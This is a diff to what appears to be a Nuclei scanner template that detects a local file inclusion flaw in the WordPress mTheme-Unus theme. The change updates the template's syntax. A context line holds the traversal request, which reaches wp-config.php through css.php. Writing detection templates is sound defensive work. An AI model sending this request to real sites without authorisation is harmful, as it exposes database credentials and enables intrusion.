@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: mthemeunus-lfi
 info:
   name: WordPress mTheme-Unus Theme - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: wordpress,wp-theme,lfi,wordpress,mtheme
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
